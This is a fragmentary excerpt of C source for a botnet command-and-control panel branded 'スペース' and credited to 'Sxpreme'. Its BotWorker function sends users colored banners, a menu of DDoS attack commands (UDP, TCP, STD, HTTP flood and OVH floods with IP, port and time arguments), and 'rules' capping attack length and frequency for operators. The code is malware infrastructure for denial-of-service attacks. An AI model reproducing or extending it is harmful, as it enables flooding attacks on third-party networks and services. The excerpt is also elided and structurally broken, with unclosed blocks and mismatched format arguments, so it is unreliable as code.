...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(ascii_banner_line1,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line2,"\e[91m                                                            \r\n");   
		sprintf(ascii_banner_line3,"\e[91m                                                            \r\n");
	    sprintf(ascii_banner_line4,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line5,"\e[91m [\e[31m+\e[90m] Welcome to \e[31mスペース\e[0;90m[\e[31m+\e[90m]\r\n");
		sprintf(ascii_banner_line6,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line7,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line8,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line9,"\e[91m                                                            \r\n");
		sprintf(ascii_banner_line10,"\e[33m\r\n");
                                  


        sprintf(welcome_line,       "\e[97m                  \e[97m Welcome To \e[31mスペース              \r\n", accounts[find_line].username);
		sprintf(banner_bot_count, 	"\e[97m                  Please type 'rules' \e[97m             \r\n", BotsConnected(), OperatorsConnected);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "?")) {
			    ...
			    sprintf(helpline1,  " \e[97m   [+] \e[31mATTACK COMMANDS\e[97m [+]\r\n\r\n");
				sprintf(helpline2,  " \e[97m- \e[31mUDP         \e[31m|  \e[97m!* UDP IP PORT TIME 32 1460 10\r\n");
				sprintf(helpline3,  " \e[97m- \e[31mTCP         \e[97m|  \e[97m!* TCP IP PORT TIME 32 all 0 10\r\n");
				sprintf(helpline4,  " \e[97m- \e[31mSTD         \e[31m|  \e[97m!* STD IP PORT TIME\r\n"); 
				sprintf(helpline5,  " \e[97m- \e[31mHTTP        \e[97m|  \e[97m!* HTTPFLOOD Post IP PORT /index.html 30 10000\r\n");
				sprintf(helpline6,  " \e[97m- \e[31mOVH         \e[31m|  \e[97m!* OVH IP PORT TIME 32 SIZE 10\r\n");
                sprintf(helpline7,  " \e[97m- \e[31mKILL ATTKS  \e[97m|  \e[97m!* KILL\r\n");
				sprintf(helpline8,  " \e[97m- \e[31mBOTS        \e[31m|  \e[97mSHOWS BOT COUNT\r\n");
				sprintf(helpline9,  " \e[97m- \e[31mCLEAR       \e[97m|  \e[97mCLEARS SCREEN\r\n");
				sprintf(helpline10, " \e[97m- \e[31mLOGOUT      \e[31m|  \e[97mLOGS USER OUT\r\n");
			...
			if(strstr(buf, "rules")) {
				...
				sprintf(hz1,  "\e[97m>---\e[0;91mRULES\e[97m---<\r\n");
				sprintf(hz2,  "\e[91m-> \e[97mNO ATTACKS LONGER THAN 300 SECONDS\r\n");
				sprintf(hz3,  "\e[91m                                     \r\n");
				sprintf(hz4,  "\e[91m-> \e[97mDON'T SPAM THE NET\r\n");
				sprintf(hz5,  "\e[91m                     \r\n");
				sprintf(hz6,  "\e[91m-> \e[97mNO MORE ATTACKS THAN 5 AN HOUR\r\n");
				sprintf(hz7,  "\e[91m                                 \r\n");
				sprintf(hz8,  "\e[91m-> \e[97mNO SHARING CREDENTIALS (Login Info)\r\n");
				sprintf(hz9,  "\e[97m                                      \r\n");
				sprintf(hz10, "\e[97m>---\e[0;91mIf You Break One Of The Rules Your Spot Will Be Removed\e[97m---<\r\n");
				sprintf(hz11, "\e[97m                                                                             \r\n");
				sprintf(hz12, "\e[91m NOTE: \e[97mSometimes Rules Update So Check This Frequently\r\n");
				sprintf(hz13, "\e[97m                                                      \r\n");

				if(send(datafd, hz1,  strlen(hz1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz2,  strlen(hz2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz3,  strlen(hz3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz4,  strlen(hz4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz5,  strlen(hz5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz6,  strlen(hz6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz7,  strlen(hz7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz8,  strlen(hz8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz9,  strlen(hz9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz10,  strlen(hz10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz11,  strlen(hz11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz12,  strlen(hz12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hz13,  strlen(hz13), MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0;91mスペース\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		...
 		if(strstr(buf, "ascii")) {
				...
				sprintf(hi2,  "\e[91m                                                                          \r\n");
				sprintf(hi3,  "\e[91m                                                                          \r\n");
				sprintf(hi4,  "\e[91m       ███████\e[97m╗\e[91m██\e[97m╗  \e[91m██\e[97m╗\e[91m██████\e[97m╗ \e[91m██████\e[97m╗ \e[91m███████\e[97m╗\e[91m███\e[97m╗   \e[91m███\e[97m╗\e[91m███████\e[97m╗\r\n");
				sprintf(hi5,  "\e[91m       ██\e[97m╔════╝╚\e[91m██\e[97m╗\e[91m██\e[97m╔╝\e[91m██\e[97m╔══\e[91m██\e[97m╗\e[91m██\e[97m╔══\e[91m██\e[97m╗\e[91m██\e[97m╔════╝\e[91m████\e[97m╗ \e[91m████\e[97m║\e[91m██\e[97m╔════╝\r\n");
				sprintf(hi6,  "\e[91m       ███████\e[97m╗ ╚\e[91m███\e[97m╔╝ \e[91m██████\e[97m╔╝\e[91m██████\e[97m╔╝\e[91m█████\e[97m╗  \e[91m██\e[97m╔\e[91m████\e[97m╔\e[91m██\e[97m║\e[91m█████\e[97m╗\r\n");
				sprintf(hi7,  "\e[91m       \e[97m╚════\e[91m██\e[97m║\e[91m ██\e[97m╔\e[91m██\e[97m╗ \e[91m██\e[97m╔═══╝ \e[91m██\e[97m╔══\e[91m██\e[97m╗\e[91m██\e[97m╔══╝  \e[91m██\e[97m║╚\e[91m██\e[97m╔╝\e[91m██\e[97m║\e[91m██\e[97m╔══╝\r\n");
				sprintf(hi8,  "\e[91m       ███████\e[97m║\e[91m██\e[97m╔╝ \e[91m██\e[97m╗\e[91m██\e[97m║     \e[91m██\e[97m║  \e[91m██\e[97m║\e[91m███████\e[97m╗\e[91m██\e[97m║ ╚═╝ \e[91m██\e[97m║\e[91m███████\e[97m╗\r\n");
				sprintf(hi9,  "\e[91m       \e[97m╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝\r\n");
				sprintf(hi10, "\e[91m                                                                          \r\n");
				sprintf(hi11, "\e[97m                By \e[91mSxpreme                                                           \r\n");
				sprintf(hi12, "\e[91m                                                                          \r\n");
				sprintf(hi13, "\e[97m                                                                          \r\n");

				if(send(datafd, hi1,  strlen(hi1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi2,  strlen(hi2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi3,  strlen(hi3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi4,  strlen(hi4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi5,  strlen(hi5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi6,  strlen(hi6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi7,  strlen(hi7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi8,  strlen(hi8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi9,  strlen(hi9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi10,  strlen(hi10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi11,  strlen(hi11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi12,  strlen(hi12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hi13,  strlen(hi13), MSG_NOSIGNAL) == -1) goto end;
